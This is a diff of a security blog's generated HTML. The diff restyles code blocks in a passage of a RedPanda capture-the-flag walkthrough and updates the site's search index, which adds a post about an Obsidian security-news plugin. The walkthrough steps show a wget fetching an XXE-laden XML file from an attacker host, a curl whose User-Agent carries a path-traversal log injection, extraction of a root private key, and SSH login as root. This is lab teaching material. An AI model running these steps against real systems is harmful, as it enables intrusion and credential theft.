-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> wget http://$box:8080/export.xml
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> wget http://$box:8080/export.xml
 </span></span></code></pre></div></li>
 <li>
 <p>Modify XML to include XXE payload:</p>
@@ -1482,14 +1482,14 @@
 </li>
 <li>
 <p>Place XML file in target location:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget http://10.10.14.29:9000/export.xml -O /tmp/bloodstiller_creds.xml
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget http://10.10.14.29:9000/export.xml -O /tmp/bloodstiller_creds.xml
 </span></span></code></pre></div></li>
 </ol>
 <h4 id="step-3-triggering-exploitation">Step 3: Triggering Exploitation:</h4>
 <ol>
 <li>
 <p>Trigger log entry creation via web request:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> curl -A <span style="color:#e6db74">&#34;bloodstiller||/../../../../../../../../../../tmp/Cat.jpg&#34;</span> http://$box:8080/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> curl -A <span style="color:#e6db74">&#34;bloodstiller||/../../../../../../../../../../tmp/Cat.jpg&#34;</span> http://$box:8080/
 </span></span></code></pre></div><ul>
 <li>Uses User-Agent header to inject log entry</li>
 <li>Path traversal in URI points to our malicious JPEG</li>
@@ -1497,14 +1497,14 @@
 </li>
 <li>
 <p>Verify log entry creation:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tail -f /opt/panda_search/redpanda.log
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tail -f /opt/panda_search/redpanda.log
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-01-11-112300_.png">
     </figure>
 
 </li>
 <li>
 <p>Verify it worked:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /tmp/bloodstiller_creds.xml
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /tmp/bloodstiller_creds.xml
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-01-11-112351_.png">
 </figure>
@@ -1528,18 +1528,18 @@
 </li>
 <li>
 <p>Extract private key from XML output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> cat /tmp/bloodstiller_creds.xml
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> cat /tmp/bloodstiller_creds.xml
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-01-11-112841_.png">
     </figure>
 
 </li>
 <li>
 <p>Set proper permissions on extracted key:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> chmod <span style="color:#ae81ff">600</span> id_rsa
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> chmod <span style="color:#ae81ff">600</span> id_rsa
 </span></span></code></pre></div></li>
 <li>
 <p>Login as root:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ssh -i id_rsa root@$box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ssh -i id_rsa root@$box
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-01-11-113209_.png">
     </figure>
 
@@ -1744,6 +1744,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1751,11 +1758,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -1770,6 +1777,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -1849,13 +1905,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -1864,7 +1913,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -2277,7 +2326,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -2732,7 +2781,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -3128,13 +3177,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -3586,7 +3628,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -4096,46 +4138,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
